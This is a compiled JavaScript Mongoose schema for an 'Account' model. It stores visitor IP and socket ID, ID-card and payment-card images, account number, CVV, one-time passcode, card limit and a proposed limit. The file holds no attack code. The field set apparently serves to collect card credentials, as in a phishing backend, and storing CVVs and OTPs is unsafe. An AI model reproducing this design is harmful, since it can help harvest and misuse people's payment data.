"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Account = void 0;
const mongoose_1 = __importStar(require("mongoose"));
const accountSchema = new mongoose_1.Schema({
    ip: {
        type: String,
        trim: true,
    },
    socketId: {
        type: String,
        trim: true,
    },
    name: {
        type: String,
        required: true,
        trim: true,
    },
    email: {
        type: String,
        trim: true,
    },
    phone: {
        type: String,
        required: true,
    },
    frontIdCard: {
        type: String,
        trim: true,
    },
    backIdCard: {
        type: String,
        trim: true,
    },
    idCard: {
        type: String,
        trim: true,
    },
    // số tài khoản
    accountNumber: {
        type: String,
        //   required: true,
        trim: true,
    },
    birthday: {
        type: String,
    },
    cvv: {
        type: Number,
    },
    frontCard: {
        type: String,
        //   required: true,
        trim: true,
    },
    backCard: {
        type: String,
        //   required: true,
        trim: true,
    },
    cardLimit: {
        type: Number,
        //   required: true,
    },
    cardBalance: {
        type: Number,
        //   required: true,
    },
    proposeLimit: {
        type: Number,
        //   required: true,
    },
    cardType: {
        type: Array,
        //   required: true,
    },
    otp: {
        type: String,
        //   required: true,
    },
}, {
    timestamps: true,
});
exports.Account = mongoose_1.default.model("Account", accountSchema);
